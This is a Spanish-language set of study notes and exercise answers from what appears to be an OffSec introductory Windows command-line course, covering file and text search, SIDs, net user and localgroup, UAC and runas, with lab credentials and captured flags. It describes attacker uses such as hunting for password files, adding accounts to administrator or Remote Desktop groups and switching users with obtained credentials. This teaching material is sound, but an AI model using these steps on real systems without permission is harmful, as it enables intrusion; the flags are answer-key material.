**6. Mueva todos los archivos de C:\\Users\\Offsec\\Desktop\\ManagingFiles\\FromDirectory a C:\\Users\\Offsec\\Desktop\\ManagingFiles\\ToDirectory. Luego, ejecute el binario *managementFiles06.exe* para verificar y obtener el indicador.

```cmd
administrator@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>move FromDirectory\* .\ToDirectory 
C:\Users\Offsec\Desktop\ManagingFiles\FromDirectory\file_0.txt
C:\Users\Offsec\Desktop\ManagingFiles\FromDirectory\file_1.txt
[...]
C:\Users\Offsec\Desktop\ManagingFiles\FromDirectory\file_9.txt
       50 file(s) moved.
```

<br />

**7. En C:\\Users\\Offsec\\Desktop\\ManagingFiles encontrará un enlace simbólico a otro archivo. ¿Cuál es el nombre del archivo vinculado?**

Podemos ver el nombre del archivo al final de la cadena al aplicar type SymLink.lnk

<br />




































#### 1.5. Searching For Files and Text.

**Locating Files through CMD**

En esta sección, cubriremos cómo localizar archivos en Windows. Windows no tiene un equivalente del _find_ de Linux . Sin embargo, aún podemos buscar archivos usando una variedad de otros comandos. En esta sección, nos centraremos en el uso de *dir*, *tree* y *forfiles*.

Ya estamos familiarizados con dir. Una de las opciones que aún no hemos explorado es la opción /s, que nos permite buscar cualquier archivo en la carpeta dada y cualquiera de sus subcarpetas. Si no especificamos un directorio principal, la búsqueda comenzará en el directorio de trabajo actual.

```
C:\Users\Offsec>dir /s trojan.txt
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec\Documents

05/25/2021  08:35 PM             2,771 trojan.txt
               1 File(s)          2,771 bytes

     Total Files Listed:
               1 File(s)          2,771 bytes
               0 Dir(s)  32,443,052,032 bytes free
```

Aquí usamos dir /s para encontrar malware.

Podemos usar el carácter comodín (\*) para buscar todos los archivos con una extensión determinada. Por ejemplo, si queremos buscar todos los ejecutables en una carpeta determinada, podemos hacerlo así.

```
C:\Users\Offsec>dir /s *.exe /p
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\Users\Offsec\AppData\Local\atom

05/25/2021  02:29 PM         1,709,096 Update.exe
               1 File(s)      1,709,096 bytes

 Directory of C:\Users\Offsec\AppData\Local\Discord

05/25/2021  11:43 PM         1,512,760 Update.exe
               1 File(s)      1,512,760 bytes
...
```

Usamos el modificador /p, en el ejemplo anterior, para pausar la impresión después de que la página del terminal esté llena, de modo que podamos examinar la salida al ritmo que prefiramos.

El comando *tree* produce una visualización bastante llamativa de la estructura del directorio.

```
C:\Users\Offsec>tree
Folder PATH listing
Volume serial number is 523D-9369
C:.
...
├───Links
├───Music
│   └───Artists
│       ├───Albums
│       │   ├───Songs
│       │   ├───Generated
│       │   └───MyMusic
├───SecretStuff
│   ├───Documents
│   ├───Firewalls
│   │   ├───DontCheckHere
│   ├───Databases
│   │   ├───VPNs
│   │   ├───Images
│   │   ├───Resources
│   │   └───Videos
│   ├───Intelligence
│   │   ├───Profiles
│   │   ├───Policies
│   │   └───Orientation
│   │       └───scripts
...
```

Podemos usar tree para buscar fácilmente en el directorio de inicio de un usuario para encontrar archivos interesantes. El indicador /F mostrará cualquier archivo que exista dentro de cada uno de los directorios en la salida.

El comando *forfiles* es una herramienta expresiva que puede ejecutar otros comandos en un conjunto definido de archivos. Aunque forfiles es muy versátil, aquí nos centraremos en su capacidad de búsqueda.

En el siguiente ejemplo, usaremos forfiles para encontrar la ruta de notepad.exe . Usaremos varias banderas:

- /P especifica dónde comenzar nuestra búsqueda. 
- /S indica que queremos buscar recursivamente. 
- /M apunta a lo que queremos buscar. 
- /C ejecuta un comando especificado. En este caso, queremos enviar la ruta del archivo a nuestra terminal.

```
C:\Users\Offsec>forfiles /P C:\Windows /S /M notepad.exe /c "cmd /c echo @PATH"
...
"C:\Windows\SysWOW64\notepad.exe"
ERROR: Access is denied for "C:\Windows\SysWOW64\Com\dmp\".
ERROR: Access is denied for "C:\Windows\SysWOW64\config\".
ERROR: Access is denied for "C:\Windows\SysWOW64\Configuration\".
ERROR: Access is denied for "C:\Windows\SysWOW64\FxsTmp\".
ERROR: Access is denied for "C:\Windows\SysWOW64\Msdtc\".
ERROR: Access is denied for "C:\Windows\SysWOW64\networklist\".
ERROR: Access is denied for "C:\Windows\SysWOW64\sru\".
ERROR: Access is denied for "C:\Windows\SysWOW64\Tasks\".
```

Si bien logramos encontrar la ruta del bloc de notas, notamos que hay algunos errores en la salida. Esto se debe a que *forfiles* busca a través de los permisos del usuario que lo ejecuta.

<br />

**Searching text**

Ahora que sabemos cómo buscar archivos, podemos pasar a buscar texto dentro de los archivos. Mencionamos que Windows no tiene un equivalente a *find* de Linux. En Linux, ese comando se usa para localizar un archivo. Algo confuso, en Windows el comando homónimo se usa para buscar una cadena de texto.

- *find*

Usemos find para buscar la cadena "password" en lo que parece ser un archivo importante.

```
C:\>find "password" C:\Users\Offsec\importantfile.txt

---------- C:\USERS\OFFSEC\IMPORTANTFILE.TXT
user: Johnny - password: George1984! 
```

Al igual que Bash o Zsh, el CMD de Windows admite la redirección (>, <) y la canalización (|). Usando pipes, podemos ejecutar find en la salida de otro comando:

```
C:\Users\Offsec>type importantfile.txt |find "password"
user: Johnny - password: George1984!
```

Aunque los resultados de los ejemplas anteriores son similares, es importante comprender que la ejecución de los comandos no es exactamente la misma.

En el primero, find está escaneando el contenido de importantfile.txt . En este último, en cambio, encontrar es escanear a través de la salida de type, que se imprime en la terminal.

Esto sugiere que podemos usar find de manera similar a como usaríamos *grep* de Linux . Dado que find opera en texto, y dado que la salida del terminal es texto, podemos usar find de manera efectiva en cualquier salida. Por ejemplo, podemos usarlo para buscar archivos en un directorio, de la misma manera que podemos usar *ls | grep \<directorio\>* en Linux.

```
C:\Users\Offsec>dir | find "important"
05/25/2021  09:51 AM                39 importantfile.txt

C:\Users\Offsec>
```

Si bien el comando de búsqueda es útil, no contiene todo el poder de grep. Por ejemplo, no admite REGEX (expresiones regulares).

<br />

- *findstr*

Sin embargo, podemos usar expresiones regulares con el comando *findstr*. Al igual que find, podemos usar *findstr* para buscar una cadena específica. Sin embargo, también puede buscar varias cadenas al mismo tiempo.

Cuando se proporciona a findstr más de una cadena delimitada por espacios, interpreta la entrada como un _OR_ lógico . En otras palabras, si a findstr se le proporcionan dos cadenas como entrada, buscará ocurrencias de _cualquiera_ de esas cadenas.

En el siguiente ejemplo, buscamos la cadena "Johnny" _O_ la cadena "contraseña":

```
C:\Users\Offsec>findstr "Johnny password" importantfile.txt
user: Johnny - password: George1984!
```

Observe cómo recuperamos con éxito la salida en el ejemplo anterior. Si findstr estuviera tratando de buscar la cadena literal "Johnny password", no habría informado de los resultados, ya que importantfile.txt no contiene esa cadena exacta.

<br />

- *more*

A veces, la salida de los comandos que ejecutamos llenará la pantalla y se desplazará fuera de ella, lo que dificulta captar exactamente lo que estamos buscando. El comando *more* nos permite ver convenientemente la salida. Esto es similar en comportamiento al indicador /P cuando se ejecuta con dir, pero más nos permite desplazarnos una línea a la vez, mientras que dir /P desplazará una "pantalla" a la vez. Tenga en cuenta que podemos canalizar la salida de otros comandos a more, tal como lo hicimos anteriormente con find.

Hay varios adicionales disponibles para ayudar a administrar la salida. La mejor manera de aprender más es practicar su uso y leer la información de uso con /? .

<br />

- *sort*

El comando *sort* se puede utilizar para ordenar la salida de varias maneras. Digamos que tenemos un archivo de texto lleno de números desordenados y deseamos ordenar los contenidos comenzando con el número más alto. Podemos usar el indicador /R para hacerlo.

Primero, usaremos type para verificar el contenido del archivo antes de comenzar.

```
C:\>type numbers.txt
23
80
297
41
9

C:\>sort /R numbers.txt
297
80
41
23
9
```

Como esperamos que quede claro, podemos pasar la salida de otros comandos para ordenar a través de una tubería.

<br />

**Exercises**

**1. ¿Qué opción de dir permite una lista recursiva de subdirectorios?**

/S

<br />

**2. ¿Qué comando muestra gráficamente la estructura de carpetas de una unidad o ruta?**

tree

<br />

**3. Use una de las herramientas cubiertas anteriormente para encontrar la bandera que termina con la extensión .flag. Para ingresar a la máquina mediante SSH, use las credenciales 'Offsec:Offsec'.**

```cmd
offsec@WINDOWS-01 C:\>dir /S /A /B | find ".flag"
```

<br />

**4. El usuario Freddy tiene un archivo .txt que puede contener credenciales dentro de uno de sus directorios de usuario. ¿Cuál es la ruta completa a este archivo? Para usar Escritorio remoto en la máquina, use las credenciales 'Freddy:ConyAuditBrother976'.**

```cmd
freddy@WINDOWS-01 C:\Users\Freddy>dir /S /A /B | find ".txt"
```

<br />

**Exercises 4.6.2.**

**1.  Verdadero o falso: el comando de _búsqueda_ en Windows es el equivalente al comando de búsqueda en Linux.**

False

<br />

**2. ¿Qué comando de búsqueda permite el uso de expresiones regulares?**

findstr

<br />

**3. ¿Cuál es el contenido del 101st flag en C:\\Users\\Offsec\\Desktop\\ManagingFiles\\FieldOfFlags.txt?

En primer lugar, utilizmaos la ayuda del comando 'more':

```
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>more /?         
Displays output one screen at a time.
[...]
    +n      Start displaying the first file at line n
```

Observamos que la opción '+n' empieza a desplegar el contenido del fichero a partir de la línea 'n'. De esta forma, empleamos el comando:

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>more FieldOfFlags.txt +100
OS{text_searching_is_fun_84a917da}
OS{text_searching_is_fun_367bfc59}
...
```

Y como el contenido se empieza a desplegar a partir de la línea 100, la línea 101 es la primera que se despliega.

<br />

**4. How many flags are in the file?**

Para contar elementos hacemos uso de la opción /c junto con /v "" para que cuente todas aquellas líneas que no sean vacías:

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>type FieldOfFlags.txt | find /c /v "" 
10101
```

<br />

**5. How many flags contain the string '1337'?**

Empleamos el siguiente comando de Powershell

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>type FieldOfFlags.txt | findstr 1337 | find /c /v ""   
2
```

<br />

**6. How many flags contain a number greater than 5?**

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>type FieldOfFlags.txt | findstr "6 7 8 9" | find /c /v "" 
9118

```

Este comando desplegará las líneas exactas que contengan un 6 o un 7 o un 8 o un 9 (notemos que están entre comillas pero separados por lo que se consideran patrones separados por 'findstr') y luego cuenta las líneas. 

<br />

**7. What flag is the first flag lexicographically?**

Nos está preguntando cuál es la primera flag de todas. Empleamos el siguiente comando:

```cmd
offsec@WINDOWS-01 C:\Users\Offsec\Desktop\ManagingFiles>type FieldOfFlags.txt | sort /R

[...]

OS{text_searching_is_fun_0010ef25}
OS{text_searching_is_fun_000d9a0e}
OS{text_searching_is_fun_00032d31} <---
```

Que dejará la primera para el final
#### 1.6. Windows Access Controls & Security Principles.

Esta unidad de aprendizaje ofrece una introducción sencilla a los permisos de Windows y describe en qué se diferencian de las estructuras de permisos basadas en Unix.

- *DAC*

Antes de sumergirnos en Windows, revisemos rápidamente el modelo de permnisos DAC; Discretionary Access Control, de Linux para comparar. Ya hemos cubierto el concepto de que en Linux "todo es un archivo" un objeto del que se lee algo o sobre el que se escribe algo. A su vez, cada archivo tiene tres permisos posibles: 

- Lectura (r) 
- Escritura (w)
- Ejecución (x)

Cada archivo también tiene tres posibles categorías de acceso: 

- Owner
- Group 
- Other

Para un archivo dado, se puede asignar cualquier combinación de permisos a cualquier combinación de categorías de acceso.

Windows también usa un modelo de permisos DAC, pero tiene muchos más matices. Tiene más de tres permisos y también define más de tres categorías de acceso. Además, Microsoft pone un gran énfasis en el diseño para el acceso basado en red, lo que aumenta la complejidad. Dado este énfasis en el diseño, es interesante notar que incluso el comando base para crear y administrar usuarios en un sistema Windows se llama *net*.

Generalizaremos parte de este material para que sea más equiparable a los conceptos cubiertos en el tema Conceptos básicos de Linux, pero es importante resaltar que los conceptos de usuarios y permisos de Windows no son idénticos a los de Linux. También nos vamos a centrar en los usuarios locales y los permisos en esta sección.

<br />

- *Security Principals, SIDs*

Primero cubriremos el concepto de *Security Principals* en Windows. El término "*principal*" en este caso significa *agente* o *entidad*. Esencialmente, un "principal" de seguridad es un sujeto que el sistema operativo puede optar (o no) por autenticar. Los security principals no se limitan a las cuentas de usuario humano si no que incluyen cuentas automatizadas, subprocesos, procesos, grupos de usuarios e incluso partes del propio sistema operativo, todo aquello que requiera de un permiso o autenticación para operar.

Los security principals se identifican mediante identificadores de seguridad (SID). Los SID son códigos alfanuméricos que identifican de forma exclusiva a los principals (sujetos susceptibles de recibir permisos) en una máquina  Windows. Algunos SID se consideran conocidos e identifican el mismo "principal" en todos los sistemas operativos Windows. Un ejemplo de un SID conocido es **S-1-1-0** , que pertenece al grupo *Everyone*, que incluye a todos los usuarios de la máquina.

Los SID no necesitan tener una longitud constante. Algunos son bastante cortos (como se ve arriba) y otros son secuencias de caracteres mucho más largas. Podemos comprobar el SID de nuestro usuario actual con el comando whoami proporcionándole la opción /usuario :

```
C:\>whoami /user

USER INFORMATION
----------------

User Name                 SID
========================= ============================================
offsec-machine\offsec     S-1-5-21-2753864161-1776656122-2845895175-1001
```

Cada número separado por guiones se denomina *component* (componente) y cada componente asigna valores con significados específicos. Por ejemplo, el tercer componente de un SID indica la *autoridad de identificación* del principal . En el ejemplo anterior 1, la autoridad del identificador (el tercer componente) es 5, lo que indica que el SID pertenece a una cuenta individual o a un grupo.

No profundizaremos en lo que significa cada componente y sus valores potenciales aquí. La conclusión importante es que el sistema de identificadores de seguridad proporciona a Windows un medio flexible y sólido para categorizar y hacer referencia a diferentes principios de seguridad.

Una herramienta importante que hace uso de los SID son las *Access Control Entries* (ACE) y las *Access Control List* (ACL). Una ACL es generalmente un diccionario de sujetos y conjuntos de permisos que se les han asignado. En Windows, cada elemento de una lista ACL es una entrada ACE. Hay seis tipos de ACE, y cada ACE incluye un SID, un conjunto de derechos de acceso, y varios indicadores que indican diferentes propiedades.

Los SID también son utilizados por la *Local Security Authority* (LSA) para asignar *tokens de acceso* a cada usuario cuando inicia sesión en un sistema operativo. Una exploración en profundidad de la LSA y los tokens de acceso está más allá del alcance de este tema. Por ahora, tenga en cuenta que los tokens de acceso son objetos protegidos que contienen el SID de un usuario y cualquier derecho que tenga sobre el sistema operativo.

<br />

#### 1.7. Windows User & Group Permissions.

- *Predefined Accounts in Windows*

Windows viene con un conjunto estándar de cuentas de usuario y sistema predeterminadas en cada instalación del sistema operativo. Aquí cubriremos algunos de los más importantes relacionados con la seguridad.

- **Administrator**: Es una cuenta de usuario diseñada para que el administrador del sistema administre la máquina. Su SID siempre es *S-1-5-domain-500*. El administrador tiene permisos completos en todos los archivos y directorios de la máquina. Esto lo convierte en un objetivo especialmente deseado durante las auditorías de seguridad. Es importante tener en cuenta que la cuenta de administrador está desactivada de forma predeterminada en Windows 10 y no puede ser ni eliminada ni bloqueada. Durante la creación inicial de la cuenta, normalmente se le asignarán permisos administrativos a otra cuenta de usuario. Estos permisos se proporcionan a través de la pertenencia al grupo de administradores locales (Local Administrators).

- **Guest**: La cuenta de invitado permite que los usuarios que no son usuarios de la máquina inicien sesión temporalmente con permisos restrictivos. Pertenece al grupo _Invitados_ , con SID S-1-5-32-546. De manera predeterminada, la cuenta de invitado está deshabilitada, pero cuando está habilitada, a menudo tiene una contraseña en blanco. Es importante tener en cuenta las implicaciones desde una perspectiva de seguridad porque si la cuenta de invitado de una víctima ha sido habilitada, a menudo podemos iniciar sesión en ella.

* **SYSTEM**: El sistema operativo utiliza la cuenta SYSTEM para ejecutar servicios que necesitan permisos elevados. De forma predeterminada, tiene todos los permisos del Administrador, pero se supone que un usuario humano no puede iniciar sesión en ella. Dicho esto, algunos exploits pueden permitirnos ejecutar código en el contexto de su propietario. Si se explota un proceso que se ejecuta como SISTEMA, es posible que podamos suplantar al usuario del SISTEMA.

<br />

- *net*

Podemos usar el comando *net* para agregar, eliminar y modificar cuentas de usuario y membresía de grupos en una máquina local o en red. El comando net contiene una serie de subcomandos, cada uno de los cuales realiza una función específica.

Para invocar un subcomando, lo proporcionamos a *net* como argumento. Si ejecutamos net sin argumentos, recibimos una lista de sus subcomandos como salida.

```
C:\>net
The syntax of this command is:

NET
    [ ACCOUNTS | COMPUTER | CONFIG | CONTINUE | FILE | GROUP | HELP |
      HELPMSG | LOCALGROUP | PAUSE | SESSION | SHARE | START |
      STATISTICS | STOP | TIME | USE | USER | VIEW ]
```

También podemos obtener información de uso un poco más amplia con la ayuda de la red .

```
C:\>net help
The syntax of this command is:

NET HELP
command
     -or-
NET command /HELP

  Commands available are:

  NET ACCOUNTS             NET HELPMSG              NET STATISTICS
  NET COMPUTER             NET LOCALGROUP           NET STOP
  NET CONFIG               NET PAUSE                NET TIME
  NET CONTINUE             NET SESSION              NET USE
  NET FILE                 NET SHARE                NET USER
  NET GROUP                NET START                NET VIEW
  NET HELP

  NET HELP NAMES explains different types of names in NET HELP syntax lines.
  NET HELP SERVICES lists some of the services you can start.
  NET HELP SYNTAX explains how to read NET HELP syntax lines.
  NET HELP command | MORE displays Help one screen at a time.
```

Con permisos administrativos, podemos crear un nuevo usuario local en nuestra máquina con usuario de red .

```
C:\>net user /add Tristan greatpassword
The command completed successfully.

C:\>net user Tristan
User name                    Tristan
Full Name
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/25/2021 11:01:31 AM
Password expires             7/8/2021 11:01:31 AM
Password changeable          5/25/2021 11:01:31 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Users
Global Group memberships     *None
The command completed successfully.
```

En el ejemplo anterior, creamos un nuevo usuario con la opción /add y proporcionamos un nombre de usuario y una contraseña. Luego usamos net user nuevamente para obtener información sobre la nueva cuenta. Podemos verificar si la cuenta está habilitada o no a través de la línea "Cuenta activa". En este caso, la cuenta está habilitada porque la acabamos de crear.

También podemos usar net para ver y modificar la membresía del grupo local. Un grupo local (local group) es un conjunto de cuentas a las que se les pueden asignar permisos en una máquina local. Usemos net localgroup para recuperar información de grupos locales en nuestro sistema.

```
C:\>net localgroup

Aliases for \\Offsec-Machine

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users
The command completed successfully.
```

Dos grupos importantes para la seguridad son *Administrator* y  *Remote Desktop Users*. 

Cualquier miembro de Administradores tiene permisos equivalentes a la cuenta de Administrador, y cualquier miembro de Usuarios de Escritorio remoto puede acceder a la máquina de forma remota si el servicio *Remote Desktop* está habilitado. A menudo, si un atacante obtiene la ejecución remota de código en una máquina con privilegios administrativos, agregará un usuario al sistema, agregará el nuevo usuario al grupo Remote Desktop User y luego iniciará sesión en la máquina de forma remota. Esto les proporciona acceso GUI completo al destino.

Ahora agreguemos "Tristan" al grupo Administradores con net localgroup .

```
C:\>net localgroup Administrators Tristan /add
The command completed successfully.
```

Ahora limpiaremos eliminando a "Tristan" del grupo Administradores y luego eliminando la cuenta.

```
C:\>net localgroup Administrators Tristan /del
The command completed successfully.


C:\>net user /del Tristan
The command completed successfully.
```

Otro subcomando net útil es *Accounts* . Podemos usar cuentas *net accounts* para mostrar o establecer account policies.

```
C:\>net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          90
Minimum password length:                              8
Length of password history maintained:                5
Lockout threshold:                                    4
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

Finalmente, para completar, mencionaremos la existencia de grupos de seguridad por defecto. Cubriremos esto más adelante en un tema futuro.

<br />


**Exercises**

**1.  ¿Qué comando se puede usar para mostrar y establecer la configuración de la política de usuario en una computadora local?**

net accounts

**2. Verdadero o falso: la cuenta de administrador predeterminada no se puede eliminar ni bloquear, pero se puede cambiar el nombre o desactivar.**

True

**3. ¿Qué grupo local otorga a sus miembros en un servidor local permisos de "Control total" en esa computadora?**

Administrators

**4. ¿Qué otra cuenta local tiene los mismos derechos y permisos funcionales que la cuenta de administrador?**

SYSTEM

<br />

**A continuación nos logeamos en la máquina como el usuario "LeadSinger:HearMeRoar"**

<br />

**5. Cuantos usuarios hay en el sistema**

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>net user

User accounts for \\WINDOWS-01

-------------------------------------------------------------------------------
Administrator            Bassist                  DefaultAccount
Drummer                  Freddy                   Gues
Guitarist                LeadSinger               Offsec
sshd                     WDAGUtilityAccount
The command completed successfully.
```

<br />

**6. Qué otra cuenta además del administrator tiene privilegios de administrador?**

Sabemos que la única forma de dotar con derechos de administrador a otra cuenta distinta del administrador es añadirla al Administrator localgroup, de esta forma, examinamos qué otros usuarios están en esa cuenta con 'net'.

```
leadsinger@WINDOWS-01 C:\Users\LeadSinger>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------
Administrator
LeadSinger
The command completed successfully.
```

<br />

**7. Qué otro usuario es miembro del grupo Percusion?

Repetimos la operación anterior cambiando el nombre del grupo:

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>net localgroup Percussion    
Alias name     Percussion
Comment        

Members

-------------------------------------------------------------------------------
Drummer
The command completed successfully.
```

<br />

**8. Cuál es el tamaño mínimo de una contraseña en este equipo?**

Empleamos el siguiente comando y obtenemos:

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          0
Maximum password age (days):                          42
Minimum password length:                              12

[...]
```

<br />

**9. Qué cuenta está deshabilitada?**

Recurrimos al siguiente comando:

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>wmic useraccount
AccountType  Caption                        Description                                                                                      Disabled  Domain      FullName  InstallDate  LocalAccount  Lockout  Name                Password
Changeable  PasswordExpires  PasswordRequired  SID                                           SIDType  Status
512          WINDOWS-01\Administrator       Built-in account for administering the computer/domain                                           FALSE     WINDOWS-01                         TRUE          FALSE    Administrator       TRUE    
            FALSE            TRUE              S-1-5-21-856803533-2522691987-786685272-500   1        OK
512          WINDOWS-01\Bassist                                                                                                              TRUE      WINDOWS-01                         TRUE          FALSE    Bassist             TRUE
[...]
```

Vemos que 'Bassist' es la cuenta que busamos.

<br />

**10.  Cree un usuario llamado Pianista y agréguelo a los grupos "Cuerdas" y "Percusión". Luego ejecute el binario en C:\\Users\\LeadSinger\\Desktop\\net-check.exe para obtener la bandera.**

Llevamos a cabo las siguientes operaciones:

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>net user /add Pianist Password1234
The command completed successfully.


leadsinger@WINDOWS-01 C:\Users\LeadSinger>net localgroup Strings /add Pianist  
The command completed successfully.       


leadsinger@WINDOWS-01 C:\Users\LeadSinger>net localgroup Percussion /add Pianist  
The command completed successfully.


leadsinger@WINDOWS-01 C:\Users\LeadSinger>net user Pianist                        
User name                    Pianis
Full Name
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/22/2023 3:44:24 PM
Password expires             3/5/2023 3:44:24 PM
Password changeable          1/22/2023 3:44:24 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Percussion           *Strings
                             *Users
Global Group memberships     *None
The command completed successfully.
```

Y cogemos la flag:

```cmd
leadsinger@WINDOWS-01 C:\Users\LeadSinger>C:\Users\LeadSinger\Desktop\net-check.exe
Very nice! Your flag is:
OS{Piano-is-a-stringed-percussion-instrument!}
```

<br />

**UAC**

User Account Control (UAC) es otra característica de seguridad en Windows que no tiene un equivalente estándar de Linux. Su propósito, en general, es proteger contra acciones maliciosas al obligar a un usuario humano activo a confirmar manualmente las acciones administrativas por medio de un aviso o cuadro de mensaje.

Los detalles de cómo funciona UAC están más allá del alcance de este tema. Para nuestros propósitos, queremos destacar tres conclusiones importantes.

1. Las cuentas Administrator y SYSTEM de Windows no cuentan con la misma cantidad de poder que root en máquinas similares a Unix.

2. UAC es uno de los métodos de Microsoft para aplicar el principio de privilegio mínimo (Principle Of Least Privilege). POLP enuncia que a los usuarios, cuentas y sistemas deben tener acceso solo a las cosas que necesitan para hacer su trabajo.

3. Las ventanas emergentes que activa UAC son un fenómeno importante que debe tener en cuenta un atacante. Si un atacante activa UAC con una acción maliciosa, es probable que el usuario activo se dé cuenta. Los atacantes fuertes tienen un buen modelo de qué acciones pueden desencadenar UAC, para que puedan evitarlo mejor.

**Runas & CMD /c**

Windows viene con un comando para impersonar a otro usuario llamado *runas*. 

No es tan poderoso como *sudo*, pero puede usarse para elevar los privilegios temporalmente. 

Ejecutemos runas sin argumentos para mostrar su información de uso:

```
C:\>runas
RUNAS USAGE:

RUNAS [ [/noprofile | /profile] [/env] [/savecred | /netonly] ]
        /user:<UserName> program

RUNAS [ [/noprofile | /profile] [/env] [/savecred] ]
        /smartcard [/user:<UserName>] program

RUNAS /trustlevel:<TrustLevel> program

   /noprofile        specifies that the user's profile should not be loaded.
                     This causes the application to load more quickly, but
                     can cause some applications to malfunction.
   /profile          specifies that the user's profile should be loaded.
                     This is the default.
   /env              to use current environment instead of user's.
   /netonly          use if the credentials specified are for remote
                     access only.
   /savecred         to use credentials previously saved by the user.
   /smartcard        use if the credentials are to be supplied from a
                     smartcard.
   /user             <UserName> should be in form USER@DOMAIN or DOMAIN\USER
   /showtrustlevels  displays the trust levels that can be used as arguments
                     to /trustlevel.
   /trustlevel       <Level> should be one of levels enumerated
                     in /showtrustlevels.
   program         command line for EXE.  See below for examples

Examples:
> runas /noprofile /user:mymachine\administrator cmd
> runas /profile /env /user:mydomain\admin "mmc %windir%\system32\dsa.msc"
> runas /env /user:user@domain.microsoft.com "notepad \"my file.txt\""

NOTE:  Enter user's password only when prompted.
NOTE:  /profile is not compatible with /netonly.
NOTE:  /savecred is not compatible with /smartcard.
```

Dado que *runas* puede ejecutar comandos con los permisos de otro usuario, puede ser útil que los atacantes lo intenten si obtienen acceso de bajo nivel a una máquina.

Otra cosa que los atacantes pueden hacer con acceso limitado a un objetivo (por ejemplo, a través de la ejecución de comandos remotos) es invocar el propio binario cmd.exe. 

Hasta ahora, hemos estado ejecutando cmd.exe como una terminal con permisos legítimos para hacerlo. Sin embargo, dado que cmd.exe es un binario que puede ejecutarse como cualquier otro, un atacante remoto puede usarlo para ejecutar comandos arbitrarios individuales. Podemos hacer esto con la opción /c , que ejecuta el comando que se proporciona como argumento y luego finaliza inmediatamente.

```
C:\>echo hi
hi

C:\>cmd /c echo hi
hi
```

Si bien la salida de los dos comandos del listado 8 es la misma, el ejecutor de esos comandos es diferente. El primer comando fue ejecutado por el proceso cmd.exe que se ejecuta dentro de la terminal, pero el segundo comando inició otro proceso cmd.exe separado, y este segundo proceso ejecutó "echo".

*runas* se usa mejor con una interfaz GUI, ya que ejecuta el comando deseado en un contexto diferente al del shell que lo inicia. Por lo tanto, usaremos la utilidad *rdesktop* en Kali Linux para conectarnos de forma remota a la GUI de destino de Windows en lugar de nuestra conexión SSH habitual. La sintaxis de *rdesktop* es:

```cmd
rdesktop -u USERNAME -p PASSWORD IP_ADDRESS 
```

Las opciones *-f* y *-g* también pueden ser útiles para una mejor visibilidad.

<br />

**Exercises**

**3.  Este es un escenario. Ha estado realizando una prueba de penetración en el sistema Windows y ha logrado un acceso gráfico de bajo nivel a la cuenta de Guitarrista. También obtuvo las credenciales para la cuenta de LeadSinger y sabe que LeadSinger tiene privilegios administrativos. Tu tarea es usar tu acceso como Guitarrista para obtener la bandera en el directorio AppData de LeadSinger.

**Contraseña del guitarrista: ImSoMetal Contraseña del cantante principal: HearMeRoar**

**Use el comando *rdesktop -u Guitarist -p ImSoMetal <target_IP>* en Kali Linux para acceder a la máquina Windows de destino con la cuenta "Guitarrista". Puede ser fácil ver cómo se puede subvertir este ejercicio ya que ya tiene acceso administrativo a la máquina a través de LeadSinger. Te animamos a que sigas el juego y utilices la cuenta Guitarrista para que aproveches al máximo el ejercicio.**

Comenzamos logeándonos en la cuenta de Guitarist a través de *rdesktop*:

```bash
rdesktop -u Guitarist -p ImSoMetal <IP>
```

Se abre una GUI de Windows con el usaurio Guitarist y abrimos una cmd en la que introducimos el siguiente comando:

```cmd
C:\Users\Guitarist>runas /user:LeadSinger cmd                                                                           Enter the password for LeadSinger:                                                                                      Attempting to start cmd as user "WINDOWS-01\LeadSinger" ...
```

Después de que se nos solicite la contraseña y la instroduzcamos correctamente obtenemos una nueva sesión de cmd pero esta vez propiedad de LeadSinger:

```cmd
C:\WINDOWS\system32>whoami                                                                                              windows-01\leadsinger 
```

Así, nos dirigimos a AppData de su carpeta personal y obtenemos la Flag:

```cmd
C:\WINDOWS\system32>whoami                                                                                              windows-01\leadsinger 

C:\WINDOWS\system32> cd C:\Users\LeadSinguer\AppData

C:\Users\LeadSinger\AppData>dir
 Volume in drive C has no label.
 Volume Serial Number is 7ADD-E6C8

 Directory of C:\Users\LeadSinger\AppData

09/07/2021  01:31 PM                30 admin_flag.txt
09/07/2021  01:24 PM    <DIR>          Local
09/07/2021  01:22 PM    <DIR>          LocalLow
09/07/2021  01:22 PM    <DIR>          Roaming
               1 File(s)             30 bytes
               3 Dir(s)  10,472,734,720 bytes free

C:\Users\LeadSinger\AppData>type admin_flag.txt
OS{Now-I'm-a-LEAD-Guitarist}
```

<br />

#### 1.8. Introduction to Windows Permissions (NFTS Permissions).

